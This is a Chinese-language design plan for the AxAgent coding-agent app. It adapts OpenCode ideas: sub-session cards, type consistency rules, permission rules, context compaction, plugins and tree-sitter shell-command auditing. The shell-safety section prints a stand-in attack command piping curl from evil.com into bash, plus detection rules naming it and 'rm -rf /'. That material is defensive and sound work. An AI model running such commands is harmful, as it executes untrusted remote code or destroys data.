# 借鉴 OpenCode 改进方案

> **版本**: v1.0  
> **日期**: 2026-04-29  
> **目标**: 将 OpenCode (`opencode-dev`) 的可借鉴设计引入 AxAgent，作为后续编码指导

---

## 一、总览

通过对比分析 OpenCode 与 AxAgent 的架构、工具系统、智能体展示、上下文管理等维度，共梳理出 **9 个可借鉴方向**，按优先级分为三个层级：

| 层级 | 方向 | 影响范围 | 工作量 |
|------|------|---------|--------|
| **P0** | 子会话卡片 + 面包屑导航 | 前端 UI 重构 | 大 |
| **P0** | 前端一致性原则 | 全栈规范 | 持续 |
| **P1** | 权限规则系统升级 | 后端 + 前端 | 中 |
| **P1** | 上下文压缩策略优化 | 后端 | 中 |
| **P1** | 插件 / Hook 体系 | 后端 + 前端 | 大 |
| **P1** | Tree-sitter 命令安全解析 | 后端 | 小 |
| **P2** | 指令文件加载 (AGENTS.md) | 后端 + 前端 | 小 |
| **P2** | Agent 自然语言生成 | 后端 + 前端 | 中 |
| **P2** | Part-based 消息模型 | 后端 + 前端 | 大 |

---

## 二、P0 - 子会话卡片 + 面包屑导航（替代多面板切换）

### 2.1 现状问题

当前 AxAgent 的子智能体执行状态分散在 **6+ 个独立面板**中，与主聊天流割裂：

| 当前面板 | 职责 | 问题 |
|---------|------|------|
| `MultiAgentDashboard.tsx` | 多智能体编排总览 | 需要用户主动打开/切Tab |
| `MultiAgentStatusPanel.tsx` | 智能体树形视图 | 树形结构在聊天场景中信息过载 |
| `AgentTaskList.tsx` | 右下角浮动任务列表 | 遮挡聊天内容，状态不同步 |
| `TaskDecompositionPanel.tsx` | DAG 任务分解图 | 独立生命周期，与消息流无关 |
| `AutonomousPlanView.tsx` | 阶段/计划视图 | 与消息时间线完全分离 |
| `ThoughtChainPanel.tsx` | 推理链可视化 | 独立卡片，需要手动打开 |

**核心问题**: 用户在主聊天流和多个面板之间来回切换，无法**在一条时间线中追踪完整的父子智能体协作过程**。

### 2.2 目标方案

借鉴 OpenCode 的设计，用 **统一消息时间线 + 子会话卡片 + 面包屑导航** 替代多面板方案。

#### 2.2.1 总体概念

```
┌──────────────────────────────────────────────────────┐
│  父会话                                              │
│                                                      │
│  [用户] 帮我重构 src/agent/coordinator.rs             │
│                                                      │
│  [助手] 我将分解这个任务                              │
│         ├─ 📋 探索代码结构 ______ explore             │  ← 子会话卡片
│         ├─ 📋 提取接口定义 ______ 等待中               │
│         └─ 📋 编写单元测试 ______ 等待中               │
│                                                      │
│  [助手] ✅ explore 完成。发现 3 个模块需要调整         │
│                                                      │
│  [用户] 继续                                          │
│                                                      │
│  [助手]                                                │
│         ├─ ✏️ 提取 Trait 接口 ______ general          │  ← 子会话卡片
│         └─ 🧪 编写测试      ______ general           │  ← 子会话卡片
│                                                      │
└──────────────────────────────────────────────────────┘

点击子会话卡片 → 导航到子会话页面：

┌──────────────────────────────────────────────────────┐
│  🏠 重构 coordinator / ✏️ 提取 Trait 接口             │  ← 面包屑
│                                                      │
│  [子智能体] 我将分析 coordinator.rs...                │
│  [子智能体] <tool-call> read coordinator.rs          │
│  [子智能体] 找到了核心 ReAct 循环，建议提取为 trait   │
│  [子智能体] ✅ 任务完成                               │
│                                                      │
│  ┌──────────────────────────────────────────────┐    │
│  │ 提示: 子智能体为父任务 "重构 coordinator" 工作  │    │
│  │ [返回父会话]                                   │    │
│  └──────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────┘
```

#### 2.2.2 子会话卡片组件

**新组件**: `SubAgentCard` (替代现有的面板组件)

```typescript
// src/components/chat/SubAgentCard.tsx

interface SubAgentCardProps {
  agentType: string;           // 智能体类型: "explore", "general", "build", "plan" 等
  agentName: string;           // 显示名称
  agentColor: string;          // 色标 (hash based)
  description: string;         // 任务描述
  status: "pending" | "running" | "completed" | "failed";
  sessionId?: string;          // 子会话 ID (完成/执行中时回填)
  onNavigate?: () => void;     // 点击跳转到子会话
  result?: string;             // 完成后展示的摘要结果 (可选)
}
```

**渲染规范**:

| 属性 | 规范 |
|------|------|
| 外形 | 紧凑卡片，`border: 1px solid var(--border-weak); border-radius: 8px; padding: 12px` |
| 背景 | `var(--bg-surface)` 或 `color-mix(in srgb, var(--bg-base) 92%, transparent)` |
| 左侧图标 | 智能体类型图标 (explore=🔍, general=🔧, build=🏗, plan=📋, code=💻) |
| 标题行 | 智能体名称 (agentColor 着色) + 运行中 spinner |
| 描述行 | 灰色小字，单行省略 |
| 底部状态 | `pending`=虚线边框+灰色文字, `running`=脉冲动画, `completed`=绿色边框+勾, `failed`=红色边框+叉 |
| 悬停交互 | 完成的卡片出现 `→` 导航箭头, cursor=pointer |
| 点击行为 | 已完成/执行中: 导航到子会话; 等待中: 无操作 |
| 展开 (可选) | 完成的卡片可内联展开显示摘要结果 (≤3行)，无需导航 |

**同一轮中的多个卡片**:
- 同一助理消息内的多个子智能体卡片**纵向排列**，用 `flex` 包裹
- 用 1px dashed 分隔线连接，示意"同一批任务"

#### 2.2.3 子会话页面

**路由**: `/session/:parentId/:childId`

**关键行为**:

```
1. 顶部面包屑         "父会话标题" / "子智能体任务"
2. 父会话标题可点击    → 导航回父会话（滚动到对应消息位置）
3. 输入框禁用         → 显示 "子智能体会话不支持直接输入"
4. 底栏提示条         → "此会话由父智能体自动管理 | [返回父会话]"
5. 智能体/模型切换    → 禁用，只能使用启动时指定的智能体
```

**面包屑实现要点**:
- 从 `session.parentId` 获取父会话 ID
- 子会话标题使用 `task` 工具调用时的 `description` 参数
- 回退: `session.parentId` 为 null → 不显示面包屑（即根会话）
- 面包屑与标题在同一行，用 `/` 分隔

#### 2.2.4 需要废弃/重构的现有组件

| 组件 | 处置 | 替代方案 |
|------|------|---------|
| `MultiAgentDashboard.tsx` | 废除 | 子会话概览列表 (可选保留，下沉为会话历史过滤器) |
| `MultiAgentStatusPanel.tsx` | 废除 | `SubAgentCard` 内联渲染 |
| `AgentTaskList.tsx` | 废除 | 浮动任务列表功能合并回消息时间线 |
| `TaskDecompositionPanel.tsx` | 重构 | 保留 DAG 逻辑，展示改为 `SubAgentCard` 列表 |
| `AutonomousPlanView.tsx` | 保留但降级 | 计划视图作为子会话页面的一种特殊模式 |
| `ThoughtChainPanel.tsx` | 保留 | 每个子会话独立展示推理链 |

#### 2.2.5 后端改动

新增/修改字段:

```rust
// Session 表增加字段
pub parent_session_id: Option<String>,  // 父会话 ID
pub agent_type: String,                 // 使用的智能体类型
pub task_description: Option<String>,   // 任务描述

// Agent event 增加事件类型
"agent-subagent-card" → { agent_type, agent_name, description, status, session_id }
```

`task` 工具执行时：
1. 创建子会话，设置 `parent_session_id`
2. 在父会话的消息流中插入 `agent-subagent-card` 事件
3. 子智能体执行完毕后，发送含 `child_session_id` 的结果回父会话
4. 父会话中对应卡片状态更新为 `completed`/`failed`

#### 2.2.6 数据流

```
用户发送消息 (Agent模式)
    │
    ▼
后端 ReAct Engine
    ├─ 分析任务 → 决定调用 task 工具
    ├─ 创建子会话 (parentId = 当前会话)
    ├─ 发送 "agent-subagent-card" 事件 (status=pending)
    ├─ 子智能体执行...
    │   ├─ 子智能体工具调用 → 子会话消息
    │   └─ 子智能体完成
    ├─ 更新卡片事件 (status=completed, sessionId=xxx)
    └─ 父智能体继续推理
    │
    ▼
前端 ChatView
    ├─ 监听 "agent-subagent-card" → render SubAgentCard
    ├─ 卡片 click → navigate to /session/:parentId/:childId
    └─ 面包屑 → session.parentId 解析
```

---

## 三、P0 - 前端一致性原则

> **背景**: 2026-04-29 的前后端批量审计发现 **20 个前端调用了不存在的后端命令、15 处字段名不一致、5 处类型不匹配 (string vs array)**。根本原因是缺乏强制性的前后端一致规范。

### 3.1 核心原则

**原则 1: 类型定义的唯一真理源**

```
规则: 后端 Rust types.rs 是字段名和类型的唯一权威来源
要求: 前端 TypeScript 类型定义必须与后端序列化后的 JSON key 完全一致
禁止: 前端自定义同名类型 (如 workspace.ts 中重复定义的 AttachmentInput)
```

**原则 2: Serde 序列化兼容是铁律**

```
规则: 所有通过 Tauri IPC 序列化的 Rust 结构体, 其 #[serde] 行为决定前端看到的 key 名
      默认 snake_case → 前端也必须用 snake_case
      若使用 #[serde(rename_all = "camelCase")] → 前端用 camelCase
要求: 每个 Tauri command 的参数约定必须在代码注释中标注序列化规则
```

**原则 3: 双重 Option 必须在前端正确表达**

```
Rust: Option<Option<String>>  →  前端: string | null | undefined
Rust: Option<String>          →  前端: string | null
Rust: String                  →  前端: string
```

**原则 4: JSON 编码字段前后端一致处理**

```
规则: 后端字段若为 JSON 字符串 (如 allowed_provider_ids_json: String),
      前端也必须声明为 string, 使用时 JSON.parse()
禁止: 前端直接声明为数组类型 (如 string[])
```

**原则 5: 新增命令必须先定义后调用**

```
规则: 前端新增 invoke() 前, 必须先确认对应的 #[tauri::command] 存在
      或与后端同步新增
要求: 新增 invoke 调用点必须在 PR 描述中链接到对应的后端命令定义
```

### 3.2 类型文件组织规范

```
src/types/
├── index.ts            ← 唯一的主类型文件, 与后端 types.rs 对应
├── runtime.ts          ← 仅存放纯前端运行时类型 (如 store state, component props,
│                          不与后端直接序列化交换的)
└── [禁止] workspace.ts ← 删除, 所有类型回到 index.ts
                         或改为 re-export: export * from "./index"
```

### 3.3 invoke 调用规范

```typescript
// ✅ 正确: 参数名与后端序列化 key 完全一致
await invoke("update_conversation", {
  id: convId,                    // 后端: pub id: String
  input: {                        // 后端: pub input: UpdateConversationInput
    title: "New Title",           // 后端: pub title: Option<Option<String>>
    provider_id: "openai",        // snake_case (默认 serde)
    model_id: "gpt-4",
  }
});

// ❌ 错误: 混用 camelCase
await invoke("update_conversation", {
  id: convId,
  input: {
    providerId: "openai",         // ❌ 后端不认识此 key
  }
});
```

### 3.4 检查清单 (PR/MR 合入前)

每一笔涉及前后端数据交换的 PR 必须确认:

- [ ] 前端 `src/types/index.ts` 新增的类型字段与后端 `types.rs` 完全对齐
- [ ] 无重复类型定义 (全局搜索类型名，确保唯一)
- [ ] 前端 `invoke()` 调用参数名与后端 `#[tauri::command]` 函数参数名一致
- [ ] JSON 字符串字段处理正确 (声明为 `string` 而非 `[]` 或 `{}`)
- [ ] `Option<Option<T>>` 映射为 `T | null | undefined`
- [ ] Enum/联合类型值前后端一致 (前端类型约束范围 ≤ 后端枚举值范围)
- [ ] 新增命令出现在 `src-tauri/src/commands/` 下的一个模块中

### 3.5 自动化检查 (建议引入)

如果条件允许，建议引入以下自动化检查：

| 检查项 | 工具/方式 |
|--------|----------|
| 前端 invoke 调用 vs 后端命令注册 | 构建脚本扫描 `invoke("**")` 与 `#[tauri::command]` 做 diff |
| 类型结构体字段差异 | 用 `ts-rs` crate 或手写脚本比较索引类型 |
| JSON key 命名风格一致性 | ESLint 规则禁止 camelCase 出现在 invoke 参数中 |

---

## 四、P1 - 权限规则系统升级

### 4.1 现状

AxAgent 权限系统仅三级: `ReadOnly` / `WorkspaceWrite` / `DangerFullAccess`，粒度粗。

### 4.2 借鉴 OpenCode

OpenCode 的 `Permission.Ruleset` 支持:

```typescript
// 规则三元组
{ permission: "edit", pattern: "src/**/*.rs", action: "allow" }
{ permission: "bash", pattern: "*", action: "ask" }
{ permission: "write", pattern: "*.env", action: "deny" }
```

**关键机制**:

| 特性 | 说明 |
|------|------|
| **模式匹配** | 权限绑定到 glob pattern，而非全局 |
| **级联规则** | 默认 → 用户配置 → 智能体特定，后项覆盖前项 |
| **死循环检测** | 连续 3 次相同工具调用 → 弹窗询问用户 (Doom Loop Detection) |
| **统合权限** | `edit` 权限覆盖 `write` + `edit` + `apply_patch` 三个工具 |

### 4.3 实施建议

```rust
// 新增权限规则类型
pub struct PermissionRule {
    pub permission: String,       // "read", "write", "edit", "bash", "network"
    pub pattern: Option<String>,  // glob pattern, None = 匹配所有
    pub action: PermissionAction, // Allow / Deny / Ask
    pub risk_level: RiskLevel,    // Low / Medium / High / Critical
}

pub enum PermissionAction {
    Allow,
    Deny,
    Ask,  // 弹窗询问用户
}
```

死循环检测实现:

```rust
// 在 tool_registry.rs 中
fn check_doom_loop(&self, tool_name: &str, args: &Value) -> bool {
    let recent = self.recent_tool_calls.iter()
        .filter(|c| c.name == tool_name && c.args == args)
        .count();
    recent >= 3  // 连续 3 次完全相同的调用
}
```

---

## 五、P1 - 上下文压缩策略优化

### 5.1 现状

AxAgent 上下文管理 (`context_manager.rs`):
- 模式 1: 滑动窗口 (裁剪最旧消息)
- 模式 2: 全量压缩 (所有消息压成一段 LLM 摘要)

### 5.2 借鉴 OpenCode

OpenCode 的 `SessionCompaction` 采用**更精细的分层策略**:

```
┌─────────────────────────────────────────────┐
│  当前上下文窗口                              │
│                                             │
│  ┌─────────────────────────────────────┐    │
│  │  系统提示 + 工具定义 + 指令文件       │    │  ← 永不压缩
│  ├─────────────────────────────────────┤    │
│  │  最近 N 轮对话 (TAIL 保护区)          │    │  ← 永不裁减
│  ├─────────────────────────────────────┤    │
│  │  较旧的消息 (可裁剪区, PRUNE_MINIMUM) │    │  ← 工具输出可清空
│  ├─────────────────────────────────────┤    │
│  │  最旧的消息 (压缩区)                  │    │  ← LLM 增量摘要
│  └─────────────────────────────────────┘    │
│                                             │
│  压缩产物: 结构化 Markdown 摘要               │
│    ## Goal      原始目标                     │
│    ## Progress  Done/In Progress/Blocked    │
│    ## Key Decisions                          │
│    ## Next Steps                             │
│    ## Relevant Files                         │
└─────────────────────────────────────────────┘
```

**关键差异**:

| 维度 | AxAgent 现状 | OpenCode 做法 |
|------|------------|-------------|
| 压缩触发 | 70% 窗口填满 | 溢出时触发 |
| 压缩产物 | 全量 LLM 摘要 | **增量**更新上一次摘要 |
| 尾部保护 | 无 | 保留最近 N 轮 (可配置) |
| 修剪 | 无 | 清空旧工具输出, 但保留对话骨架 |
| 摘要格式 | 自由文本 | 结构化 Markdown 模板 |

### 5.3 实施建议

1. **增量摘要**: 不是每次都重新总结全部历史，而是在上一次摘要基础上追加新的进展
2. **尾部保护**: `context_manager.rs` 增加 `tail_turns: u32` 配置，保留最近 N 轮
3. **修剪保护**: 裁剪旧工具输出时，按 token 量分段: 20K token 以下 → 保留，20K-40K → 可选裁剪，40K+ → 优先裁剪
4. **结构化摘要模板**: 用 compaction.txt 格式的 prompt 做摘要生成

---

## 六、P1 - 插件 / Hook 体系

### 6.1 现状

AxAgent 无插件系统。所有扩展 (新工具、新功能) 必须修改核心代码。

### 6.2 借鉴 OpenCode

OpenCode 的 `@opencode-ai/plugin` 定义了标准的 Hook 接口:

```typescript
// 插件接口 (示意)
interface OpencodePlugin {
  name: string;
  hooks: {
    "chat.params"?: (ctx) => params;           // 修改 LLM 请求参数
    "chat.headers"?: (ctx) => headers;         // 注入自定义 header
    "chat.message"?: (ctx) => message;         // 转换消息内容
    "tool.definition"?: (tool) => tool;        // 修改工具定义
    "tool.execute.before"?: (ctx) => ctx;      // 工具执行前
    "tool.execute.after"?: (ctx) => result;    // 工具执行后
    "shell.env"?: (ctx) => env;                // 注入 Shell 环境变量
  };
}
```

### 6.3 实施建议

AxAgent 的 `HookChain` 已有基础，可扩展为：

```rust
// src-tauri/crates/runtime/src/plugin_hooks.rs

#[derive(Clone)]
pub struct PluginHook {
    pub name: String,
    pub priority: i32,
    pub hook_points: Vec<HookPoint>,
}

pub enum HookPoint {
    /// 修改 LLM 请求 (追加/替换 system prompt)
    ChatParamsTransform(Arc<dyn Fn(&mut ChatParams) -> Result<()>>),

    /// 工具执行前拦截 (可拒绝执行)
    ToolPreExecute(Arc<dyn Fn(&mut ToolContext) -> Result<PermissionAction>>,

    /// 工具执行后处理 (结果变换、日志)
    ToolPostExecute(Arc<dyn Fn(&ToolResult) -> Result<ToolResult>>),

    /// 消息发送前/后
    MessagePreSend(Arc<dyn Fn(&mut Message) -> Result<()>>),
    MessagePostReceive(Arc<dyn Fn(&mut Message) -> Result<()>>),
}
```

插件加载方式:
1. **内置插件**: 编译进 binary (auth, MCP 等)
2. **本地插件**: 从 `~/.axagent/plugins/` 加载 `.wasm` 或 `.dll`
3. **npm 插件** (远期): 通过 npm 安装

---

## 七、P1 - Tree-sitter 命令安全解析

### 7.1 现状

AxAgent 的 `bash` 工具（`src-tauri/crates/core/src/builtin_tools.rs`）通过正则表达式或简单字符串匹配来做安全检查，缺乏对 Shell 语法的精确理解：

- 无法区分命令调用与字符串字面量（如 `echo "rm -rf /"` 与真正的 `rm -rf /`）
- 无法识别命令链、管道、重定向中的危险操作
- 简单正则容易被绕过（换行注入、反引号嵌套等）

### 7.2 借鉴 OpenCode

OpenCode 的 `tool/bash.ts` 使用 **tree-sitter** 对 Shell 命令做 AST 级解析，能精确识别:

```
输入: echo "safe" && curl http://evil.com | bash

Tree-sitter AST 解析后:
├── command: echo
│   └── argument: "safe"
├── operator: &&
├── command: curl
│   └── argument: http://evil.com
├── operator: |
├── command: bash                     ← 危险: 执行任意命令
```

**优势**:

| 维度 | 正则/字符串匹配 | Tree-sitter AST 解析 |
|------|-------------|-------------------|
| 字符串 vs 命令区分 | ❌ 无法区分 | ✅ 精确区分 |
| 管道/重定向语义 | ❌ 盲匹配 | ✅ 理解语法结构 |
| 命令注入检测 | ❌ 易被绕过 | ✅ 从 AST 节点类型判断 |
| 新 Shell 语法扩展 | ❌ 需手写规则 | ✅ 更新 grammar 即可 |
| 跨平台 | ✅ 简单 | ⚠️ 需编译 native binding |

### 7.3 实施建议

```rust
// src-tauri/crates/core/src/shell_parser.rs (新增模块)

use tree_sitter::{Parser, Language};

pub struct ShellCommand {
    pub name: String,             // 命令名 (如 "curl", "rm")
    pub args: Vec<String>,        // 参数列表
    pub redirects: Vec<Redirect>, // 重定向
}

pub struct ParsedShell {
    pub commands: Vec<ShellCommand>,
    pub operators: Vec<String>,   // &&, ||, |, ;
}

/// 解析 Shell 命令并返回 AST
pub fn parse_shell(input: &str) -> Result<ParsedShell, ParseError> {
    let mut parser = Parser::new();
    parser.set_language(tree_sitter_bash::language())?;
    let tree = parser.parse(input, None)?;
    // 遍历 AST 节点提取命令结构
    walk_ast(tree.root_node())
}

/// 安全检查: 扫描危险命令模式
pub fn audit_shell(parsed: &ParsedShell, policy: &ShellPolicy) -> Vec<SecurityWarning> {
    let mut warnings = Vec::new();
    for cmd in &parsed.commands {
        // 检查: curl/wget 下载 + 管道到 bash/sh
        if is_download_command(&cmd.name) && has_pipe_to_shell(&parsed.operators) {
            warnings.push(SecurityWarning::PipeDownloadToShell);
        }
        // 检查: 递归删除 + 系统关键目录
        if cmd.name == "rm" && cmd.args.iter().any(|a| a.contains("-rf"))
            && cmd.args.iter().any(|a| is_system_path(a))
        {
            warnings.push(SecurityWarning::DangerousRm);
        }
        // 检查: 环境变量覆盖 (sudo, chmod 777 等)
        // ...
    }
    warnings
}
```

**依赖**:

```toml
# Cargo.toml
tree-sitter = "0.22"
tree-sitter-bash = "0.21"
```

**分级策略**:

| 风险等级 | 示例 | 处理方式 |
|---------|------|---------|
| **Critical** | `curl ... | bash`, `rm -rf /` | 拒绝执行 + 弹窗告知 |
| **High** | `sudo`, `chmod 777`, `>/etc/*` | 弹窗确认 (Ask) |
| **Medium** | `curl`/`wget` (无管道), `eval` | 日志记录 + 执行 |
| **Low** | 纯读命令 (`ls`, `cat`, `head`) | 直接通过 |

**与权限系统集成**:

解析结果可与第四章的 `PermissionRule.pattern` 配合:
```rust
// 示例: 拒绝所有包含 curl + pipe 的命令
PermissionRule {
    permission: "bash",
    pattern: None,
    action: PermissionAction::Ask,
}
// tree-sitter 解析结果用于细粒度判断
// AST info → audit_shell() → 决定 Ask 弹窗的严重程度和描述
```

---

## 八、P2 - 指令文件加载 (AGENTS.md / AXAGENT.md)

### 7.1 现状

AxAgent 无项目级指令文件机制。系统提示只能通过:
- 会话设置中手动填写
- 对话类别模板
- Skill 系统注入

### 7.2 借鉴 OpenCode

OpenCode 在每次对话开始时自动加载:

```
优先级从高到低:
1. 项目根目录:  ./AGENTS.md 或 ./CLAUDE.md
2. 全局配置:    ~/.config/opencode/AGENTS.md 或 $OPENCODE_CONFIG_DIR/AGENTS.md
3. 兼容路径:    ~/.claude/CLAUDE.md
```

加载后的指令被注入到 system prompt 的顶部:
```
<project-instructions>
AGENTS.md 的内容...
</project-instructions>
```

### 7.3 实施建议

```rust
// src-tauri/crates/runtime/src/instruction_loader.rs

pub struct InstructionLoader {
    pub paths: Vec<String>,  // 搜索路径列表
}

impl InstructionLoader {
    /// 加载所有可用指令文件
    pub fn load_all(workspace_dir: &Path) -> Vec<InstructionFile> {
        let candidates = vec![
            workspace_dir.join("AXAGENT.md"),
            workspace_dir.join("AGENTS.md"),    // 兼容 OpenCode
            workspace_dir.join(".axagent.md"),
            dirs::config_dir().unwrap().join("axagent/AGENTS.md"),
        ];
        candidates.into_iter()
            .filter(|p| p.exists())
            .map(|p| InstructionFile { path: p, content: fs::read_to_string(p)? })
            .collect()
    }
}
```

前端设置页面增加:
- 指令文件路径配置项
- 当前加载状态展示 (绿色勾/黄色加载中)
- 支持本地文件和 URL 两种来源

---

## 九、P2 - Agent 自然语言生成

### 8.1 现状

创建自定义智能体需要通过 UI 表单手动填写: identifier, whenToUse, systemPrompt 等字段。

### 8.2 借鉴 OpenCode

OpenCode 的 `agent.generate()` 使用 `generate.txt` 作为 Meta-Prompt，让 LLM 依据自然语言描述自动生成智能体配置:

```
用户输入: "我需要一个专门审查 SQL 查询安全的智能体"

LLM 生成:
{
  "identifier": "sql-reviewer",
  "whenToUse": "当需要审查 SQL 查询的安全性时",
  "systemPrompt": "你是一个 SQL 安全专家。审查所有 SQL 查询的注入风险...",
  "permissions": ["read", "grep"],
  "model": { "provider_id": "openai", "model_id": "gpt-4" }
}
```

### 8.3 实施建议

```rust
// 在 agent 生成 prompt 中约束输出格式
"你是一个智能体配置生成器。根据用户描述生成 JSON 格式的智能体定义。
必须包含: agent_type, display_name, description, system_prompt, permissions, preferred_model。
只输出 JSON，不要有其他内容。"
```

前端交互:
1. 自然语言输入框 → "生成智能体" 按钮 → 加载动画
2. 生成结果预览 (可编辑)
3. 保存 → 写入 agents 配置

---

## 十、P2 - Part-based 消息模型

### 9.1 现状

AxAgent 的消息模型较扁平:

```typescript
interface Message {
  content: string;              // 整个响应内容
  tool_calls_json: string | null;  // JSON 编码的工具调用
  status: string;               // "complete" | "partial" | "error"
}
```

### 9.2 借鉴 OpenCode

OpenCode 的 `MessageV2` 将消息拆分为多个 `parts[]`:

```typescript
type MessagePart =
  | TextPart          // 文本块
  | ToolPart          // 工具调用 (name + args + result)
  | ReasoningPart     // 推理/思考内容
  | FilePart          // 文件引用
  | StepStartPart     // 步骤开始标记
  | StepFinishPart    // 步骤结束标记
  | PatchPart         // 代码补丁 (diff)
  | AgentPart         // 子智能体调用
  | CompactionPart    // 上下文压缩标记
  | RetryPart         // 重试标记
  | SubtaskPart;      // 子任务引用
```

每个 Part 有独立的状态: `pending → running → completed/error`

### 9.3 实施建议

**短期 (低成本)**:
- 在现有 `content` 字段中使用 XML/JSON 标记做轻量结构化:
  ```
  <text>分析结果...</text>
  <tool name="read" status="done">...</tool>
  <reasoning status="done">...</reasoning>
  ```

**长期 (完整迁移)**:
- Message 表增加 `parts` JSONB 列
- 前后端逐步拆分 content 的解析逻辑
- 流式输出按 part 粒度推送

> **注意**: 此项改动涉及数据库 Schema 变更和全量前后端重构，建议作为远期目标。

---

## 十一、借鉴优先级路线图

```
阶段 1 (当前 → 2周内)          阶段 2 (2周 → 1个月)          阶段 3 (1个月 → 3个月)
┌─────────────────────┐      ┌─────────────────────┐      ┌─────────────────────┐
│ ✓ 前端一致性规范落地  │      │ ✓ 权限规则系统升级    │      │ ✓ Part-based 消息模型 │
│ ✓ 类型文件清理       │      │ ✓ 上下文压缩优化      │      │ ✓ 完整迁移 Parts 存储 │
│ ✓ invoke 参数审计    │      │ ✓ Tree-sitter 安全解析│      │                     │
│ ✓ 子会话卡片 MVP     │      │ ✓ Agent 自然语言生成  │      │                     │
│ ✓ 面包屑导航 MVP     │      │ ✓ 插件接口定义       │      │                     │
│ ✓ 废弃面板组件       │      │ ✓ 指令文件加载       │      │                     │
└─────────────────────┘      └─────────────────────┘      └─────────────────────┘
```

---

## 附录 A — 前端一致性审计清单

> 基于 `docs/frontend-backend-audit-report.md` 的 23 类问题, 用于每次 PR 自查

### A1. 类型定义检查

- [ ] 无重复类型 (全局搜索类型名)
- [ ] 字段名与后端 Serde key 一致
- [ ] `Option<Option<T>>` 映射为 `T | null | undefined`
- [ ] JSON 字符串字段声明为 `string` (非 `[]` `{}`)
- [ ] 后端必填 ≠ 前端可选 (去掉多余的 `?`)

### A2. invoke 调用检查

- [ ] 命令名与 `#[tauri::command]` 完全匹配
- [ ] 参数 key 名与后端序列化风格一致
- [ ] 无调用不存在的命令

### A3. 运行时结构检查

- [ ] `conversationStore.ts` 中 sendAgentMessage / sendMessage 的 event 类型与后端 emit 的类型一致
- [ ] 流式事件 `listen("agent-*")` 的事件 payload 结构与后端 `app_handle.emit()` 参数一致

---

## 附录 B — 子会话卡片 CSS 变量参考

```css
[data-component="sub-agent-card"] {
  --card-bg: var(--bg-surface);
  --card-border: var(--border-weak);
  --card-radius: 8px;
  --card-padding: 12px;

  --title-font-size: 14px;
  --desc-font-size: 12px;
  --desc-color: var(--text-secondary);

  --status-pending-border: var(--border-info);
  --status-running-bg: color-mix(in srgb, var(--brand-blue) 8%, transparent);
  --status-completed-border: var(--border-success);
  --status-failed-border: var(--border-danger);
}
```
